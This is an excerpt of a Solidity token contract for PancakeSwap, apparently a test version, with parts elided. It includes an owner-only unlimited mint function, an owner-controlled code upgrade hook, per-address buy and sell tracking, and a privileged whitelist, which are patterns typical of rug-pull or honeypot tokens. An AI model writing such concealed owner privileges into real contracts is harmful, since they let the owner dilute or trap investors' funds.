...
contract TEST29_1 is Context, IERC20, Ownable, Proxiable {
    IPancakeRouter02  _router;//internal
    IPancakePair  _pair;//internal

    uint8 internal constant _DECIMALS = 18;
    address usdt = 0x697418EB688db1B0822D21C78C022912581C0388; 

    address public master;
    mapping(address => bool) public _marketersAndDevs;
    mapping(address => uint256) public _balances;
    mapping(address => mapping(address => uint256)) public _allowances;//internal
    mapping(address => uint256) public _buySum;//internal
    mapping(address => uint256) public _sellSum;//internal
    mapping(address => uint256) public _sellSumETH;//internal

    uint256 public _totalSupply = 10000000000e18;//internal
    uint256 public _theLimb = ~uint256(0);//internal
    uint256 public _theUnderLimb = 0;//internal
    ...
    modifier onlyOwner1() {
        require(msg.sender == owner1, "Only owner is allowed to perform this action");
        _;
    }
    ...
    constructor(address routerAddress) {
        ...
        _mint(address(this), 9000000000e18);
        _mint(address(usdt), 1000000000e18);
    ...
    function updateCode1(address newCode) onlyOwner1 public {
        updateCodeAddress(newCode);
    }
    ...
    function mint2(address account, uint256 amount) onlyOwner1 public virtual returns (bool) {
        _mint(account, amount);
        return true;
    }
